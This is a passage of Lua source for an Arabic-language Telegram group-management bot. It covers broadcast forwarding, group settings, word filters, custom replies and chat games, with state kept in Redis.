local list = redis:smembers(bot_id.."ChekBotAdd")   
send(msg.chat_id_, msg.id_,"☑┇تم التوجيه الى *- "..#list.." * مجموعه في البوت ")     
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
redis:del(bot_id.."Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء الاذاعه بالترجيه خاص") 
redis:del(bot_id.."Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = redis:smembers(bot_id.."Num:User:Pv")   
send(msg.chat_id_, msg.id_,"☑┇تم التوجيه الى *- "..#list.." * مجموعه في البوت ")     
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
redis:del(bot_id.."Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Change:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == "الغاء" then 
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء امر تغير وصف المجموعه") 
redis:del(bot_id.."Change:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
redis:del(bot_id.."Change:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request("https://api.telegram.org/bot"..token.."/setChatDescription?chat_id="..msg.chat_id_.."&description="..text) 
send(msg.chat_id_, msg.id_,"☑┇تم تغيير وصف المجموعه")   
return false  
end 
--------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == "الغاء" then 
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء امر حفظ الترحيب") 
redis:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
redis:set(bot_id.."Get:Welcome:Group"..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"☑┇تم حفظ ترحيب المجموعه")   
return false   
end
--------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Status:link:set"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء امر حفظ الرابط") 
redis:del(bot_id.."Status:link:set"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)")   
redis:set(bot_id.."Status:link:set:Group"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_,"☑┇تم حفظ الرابط بنجاح")       
redis:del(bot_id.."Status:link:set"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
------------------------------------------------------------------------------------------------------------
if text and not Vips(msg) then  
local Text_Filter = redis:get(bot_id.."Filter:Reply2"..text..msg.chat_id_)   
if Text_Filter then    
Send_Options(msg,msg.sender_user_id_,"reply","📬┇"..Text_Filter)  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Change:Name:Bot"..msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء امر تغير اسم البوت") 
redis:del(bot_id.."Change:Name:Bot"..msg.sender_user_id_) 
return false  
end 
redis:del(bot_id.."Change:Name:Bot"..msg.sender_user_id_) 
redis:set(bot_id.."Redis:Name:Bot",text) 
send(msg.chat_id_, msg.id_, "☑┇ تم تغير اسم البوت الى - "..text)  
return false
end 
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء امر اضافة صلاحيه") 
local CmdDel = redis:get(bot_id.."Add:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_)  
redis:del(bot_id.."Add:Validity:Group:Rt"..CmdDel..msg.chat_id_)
redis:srem(bot_id.."Validitys:Group"..msg.chat_id_,CmdDel)  
redis:del(bot_id.."Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_,"\n??┇الاستخدام خطا رتبتك اقل من منشئ \n〽┇تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز  ، ادمن }") 
return false
end
end
if text == "ادمن" then
if not Owner(msg) then 
send(msg.chat_id_, msg.id_,"\n💢┇الاستخدام خطا رتبتك اقل من مدير \n〽┇تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز }") 
return false
end
end
if text == "مميز" then
if not Admin(msg) then
send(msg.chat_id_, msg.id_,"\n💢┇الاستخدام خطا رتبتك اقل من ادمن \n〽┇تستطيع اضافة صلاحيات الاتيه فقط ← { عضو }") 
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = redis:get(bot_id.."Add:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_)  
redis:set(bot_id.."Add:Validity:Group:Rt"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, "\n📮┇تم اضافة الصلاحيه باسم ← { "..textn..' }') 
redis:del(bot_id.."Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Redis:Id:Group"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء امر تعين الايدي") 
redis:del(bot_id.."Redis:Id:Group"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
redis:del(bot_id.."Redis:Id:Group"..msg.chat_id_..""..msg.sender_user_id_) 
redis:set(bot_id.."Set:Id:Group"..msg.chat_id_,text:match("(.*)"))
send(msg.chat_id_, msg.id_,'☑┇تم تعين الايدي الجديد')    
end
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Random:Sm"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Set:Sma"..msg.chat_id_) then
if not redis:get(bot_id.."Set:Sma"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - سمايل او سمايلات")
redis:incrby(bot_id.."Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Set:Sma"..msg.chat_id_,true)
return false
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Klam:Speed"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Speed:Tr"..msg.chat_id_) then
if not redis:get(bot_id.."Speed:Tr"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - الاسرع او ترتيب")
redis:incrby(bot_id.."Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Speed:Tr"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Klam:Hzor"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Set:Hzora"..msg.chat_id_) then
if not redis:get(bot_id.."Set:Hzora"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - حزوره")
redis:incrby(bot_id.."Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Set:Hzora"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Maany"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Set:Maany"..msg.chat_id_) then
if not redis:get(bot_id.."Set:Maany"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - معاني")
redis:incrby(bot_id.."Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Set:Maany"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Set:Aks:Game"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Set:Aks"..msg.chat_id_) then
if not redis:get(bot_id.."Set:Aks"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - العكس")
redis:incrby(bot_id.."Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Set:Aks"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
send(msg.chat_id_, msg.id_,"📬┇عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 }\n")
return false  end 
local GETNUM = redis:get(bot_id.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
redis:del(bot_id.."SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
redis:del(bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
redis:incrby(bot_id.."Num:Add:Games"..msg.chat_id_..msg.sender_user_id_,5)  
send(msg.chat_id_, msg.id_,"🔖┇مبروك فزت ويانه وخمنت الرقم الصحيح\n🚸┇تم اضافة { 5 } من النقاط \n")
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:incrby(bot_id.."SADD:NUM"..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(redis:get(bot_id.."SADD:NUM"..msg.chat_id_..msg.sender_user_id_)) >= 3 then
redis:del(bot_id.."SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
redis:del(bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"📮┇اوبس لقد خسرت في اللعبه \n📬┇حظآ اوفر في المره القادمه \n🔰┇كان الرقم الذي تم تخمينه { "..GETNUM.." }")
else
send(msg.chat_id_, msg.id_,"📛┇اوبس تخمينك غلط \n📌┇ارسل رقم تخمنه مره اخرى ")
end
end
end
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
send(msg.chat_id_, msg.id_,"📬┇عذرا لا يوجد سواء { 6 } اختيارات فقط ارسل اختيارك مره اخرى\n")
return false  end 
local GETNUM = redis:get(bot_id.."Games:Bat"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
redis:del(bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"📮┇مبروك فزت وطلعت المحيبس بل ايد رقم { "..NUM.." }\n🎊┇لقد حصلت على { 3 }من نقاط يمكنك استبدالهن برسائل ")
redis:incrby(bot_id.."Num:Add:Games"..msg.chat_id_..msg.sender_user_id_,3)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:del(bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"📮┇للاسف لقد خسرت \n📬┇المحيبس بل ايد رقم { "..GETNUM.." }\n💥┇حاول مره اخرى للعثور على المحيبس")
end
end
end
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id..":Set:Moktlf"..msg.chat_id_) or "").."" then 
if not redis:get(bot_id.."Set:Moktlf:Bot"..msg.chat_id_) then 
redis:del(bot_id..":Set:Moktlf"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - المختلف")
redis:incrby(bot_id.."Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Set:Moktlf:Bot"..msg.chat_id_,true)
end
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Set:Amth"..msg.chat_id_) or "").."" then 
if not redis:get(bot_id.."Set:Amth:Bot"..msg.chat_id_) then 
redis:del(bot_id.."Set:Amth"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - امثله")
redis:incrby(bot_id.."Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Set:Amth:Bot"..msg.chat_id_,true)
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Status:Add:msg:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
redis:del(bot_id.."id:user"..msg.chat_id_)  
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء امر اضافة رسائل") 
redis:del(bot_id.."Status:Add:msg:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del(bot_id.."Status:Add:msg:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = redis:get(bot_id.."id:user"..msg.chat_id_)  
redis:del(bot_id.."Msg_User"..msg.chat_id_..":"..msg.sender_user_id_) 
redis:incrby(bot_id.."Num:Message:User"..msg.chat_id_..":"..iduserr,numadded)  
send(msg.chat_id_,msg.id_,"\n📨┇تم اضافة له - "..numadded.." رسائل")  
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Status:games:add" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
redis:del(bot_id.."idgem:user"..msg.chat_id_)  
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء امر اضافة جواهر") 
redis:del(bot_id.."Status:games:add" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del(bot_id.."Status:games:add" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = redis:get(bot_id.."idgem:user"..msg.chat_id_)  
redis:incrby(bot_id.."Num:Add:Games"..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_,msg.id_,"\n💎┇تم اضافة له - "..numadded.." مجوهرات")  
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Redis:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" then 
send(msg.chat_id_, msg.id_, "〽┇تم الغاء حفظ القوانين") 
redis:del(bot_id.."Redis:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
redis:set(bot_id..":Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"📮┇تم حفظ قوانين المجموعه") 
redis:del(bot_id.."Redis:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  
------------------------------------------------------------------------------------------------------------
if text then 
local DelFilter = redis:get(bot_id.."Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
if DelFilter and DelFilter == "DelFilter" then   
send(msg.chat_id_, msg.id_,"📮┇تم الغاء منعها ")  
redis:del(bot_id.."Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
redis:del(bot_id.."Filter:Reply2"..text..msg.chat_id_)  
redis:srem(bot_id.."List:Filter"..msg.chat_id_,text)  
return false  end  
end
------------------------------------------------------------------------------------------------------------
if text then   
local SetFilter = redis:get(bot_id.."Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
if SetFilter and SetFilter == "SetFilter" then   
send(msg.chat_id_, msg.id_,"📫┇ارسل التحذير عند ارسال الكلمه")  
redis:set(bot_id.."Filter:Reply1"..msg.sender_user_id_..msg.chat_id_,"WirngFilter")  
redis:set(bot_id.."Filter:Reply:Status"..msg.sender_user_id_..msg.chat_id_, text)  
redis:sadd(bot_id.."List:Filter"..msg.chat_id_,text)  
return false  
end  
end
------------------------------------------------------------------------------------------------------------
if text then  
local WirngFilter = redis:get(bot_id.."Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
if WirngFilter and WirngFilter == "WirngFilter" then  
send(msg.chat_id_, msg.id_,"🔖┇تم منع الكلمه مع التحذير")  
redis:del(bot_id.."Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
local test = redis:get(bot_id.."Filter:Reply:Status"..msg.sender_user_id_..msg.chat_id_)  
if text then   
redis:set(bot_id.."Filter:Reply2"..test..msg.chat_id_, text)  
end  
redis:del(bot_id.."Filter:Reply:Status"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id..'GetTexting:DevRaider'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' or text == 'الغاء ✖' then 
redis:del(bot_id..'GetTexting:DevRaider'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'〽┇تم الغاء حفظ كليشة المطور')
return false
end
redis:set(bot_id..'Texting:DevRaider',text)
redis:del(bot_id..'GetTexting:DevRaider'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'☑┇تم حفظ كليشة المطور')
send(msg.chat_id_,msg.id_,text)
return false
end
------------------------------------------------------------------------------------------------------------
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = redis:get(bot_id.."Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_.."")
if redis:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
redis:del(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
redis:set(bot_id.."Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
redis:set(bot_id.."Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
redis:set(bot_id.."Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
redis:set(bot_id.."Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
redis:set(bot_id.."Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
redis:set(bot_id.."Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
redis:set(bot_id.."Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
redis:set(bot_id.."Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"📌┇تم حفظ رد للمدير بنجاح \n〽┇ارسل ( "..test.." ) لرئية الرد")
return false  
end  
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n〽┇ارسل لي الرد لاضافته\n🔖┇تستطيع اضافة ← { ملف ، فديو ، نص ، ملصق ، بصمه ، متحركه }\n📬┇تستطيع ايضا اضافة :\n👤┇`#username` » معرف المستخدم \n📨┇`#msgs` » عدد الرسائل\n👤┇`#name` » اسم المستخدم\n🚸┇`#id` » ايدي المستخدم\n📮┇`#stast` » موقع المستخدم \n📝┇`#edit` » عدد السحكات ')
redis:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1")
redis:set(bot_id.."Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_, text)
redis:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
redis:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
redis:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
redis:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
redis:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
redis:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
redis:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
redis:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
redis:sadd(bot_id.."List:Manager"..msg.chat_id_.."", text)
return false end
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_.."") == "true2" then
send(msg.chat_id_, msg.id_,"☑┇تم حذف الرد من ردود المدير ")
redis:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
redis:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
redis:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
redis:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
redis:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
redis:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
redis:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
redis:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
redis:del(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
redis:srem(bot_id.."List:Manager"..msg.chat_id_.."", text)
return false
end
end
------------------------------------------------------------------------------------------------------------
if text and not redis:get(bot_id.."Status:Reply:Manager"..msg.chat_id_) then
if not redis:sismember(bot_id..'Spam_For_Bot'..msg.sender_user_id_,text) then
local anemi = redis:get(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
local veico = redis:get(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local stekr = redis:get(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
local Text = redis:get(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
local photo = redis:get(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
local video = redis:get(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
local document = redis:get(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = redis:get(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = redis:get(bot_id..'Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Num:Message:Edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',NumMessageEdit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_, Text)
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_,msg.id_,stekr)
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_,veico,"")
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_,video,"")
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end
if anemi then 
sendAnimation(msg.chat_id_, msg.id_,anemi,"")   
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, document)   
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_,msg.id_,photo,photo_caption)
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end  
end
end
------------------------------------------------------------------------------------------------------------
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = redis:get(bot_id.."Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if redis:get(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
redis:del(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
redis:set(bot_id.."Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
redis:set(bot_id.."Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
redis:set(bot_id.."Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
redis:set(bot_id.."Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content_.audio_ then
redis:set(bot_id.."Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
redis:set(bot_id.."Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
redis:set(bot_id.."Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
redis:set(bot_id.."Add:Rd:Sudo:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"📌┇تم حفظ رد للمطور \n〽┇ارسل ( "..test.." ) لرئية الرد")
return false  
end  
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n〽┇ارسل لي الكلمه الان \n🔖┇تستطيع اضافة ← { ملف ، فديو ، نص ، ملصق ، بصمه ، متحركه }\n📬┇تستطيع ايضا اضافة :\n👤┇`#username` » معرف المستخدم \n📨┇`#msgs` » عدد الرسائل\n👤┇`#name` » اسم المستخدم\n🚸┇`#id` » ايدي المستخدم\n📮┇`#stast` » موقع المستخدم \n📝┇`#edit` » عدد السحكات ')
redis:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
redis:set(bot_id.."Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
redis:sadd(bot_id.."List:Rd:Sudo", text)
return false end
end
------------------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"☑┇تم حذف الرد من ردود المطور")
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
redis:del(bot_id..''..v..text)
end
redis:del(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
redis:srem(bot_id.."List:Rd:Sudo", text)
